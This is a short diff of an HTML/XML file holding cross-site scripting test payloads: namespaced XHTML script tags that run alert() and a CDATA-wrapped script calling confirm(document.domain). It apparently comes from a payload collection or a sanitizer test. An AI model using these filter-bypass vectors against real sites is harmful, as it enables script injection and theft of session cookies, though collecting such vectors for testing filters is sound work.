@@ -1,8 +1,8 @@
 <html>
 	<head></head>
 	<body>
-		<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert('1')</something:script>
-		<a:script xmlns:a="http://www.w3.org/1999/xhtml">alert('2')</a:script>
+		<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert('document.domain')</something:script>
+		<a:script xmlns:a="http://www.w3.org/1999/xhtml">alert('document.cookie')</a:script>
 		<info>
 		  <name>
 		    <value><![CDATA[<script>confirm(document.domain)</script>]]></value>
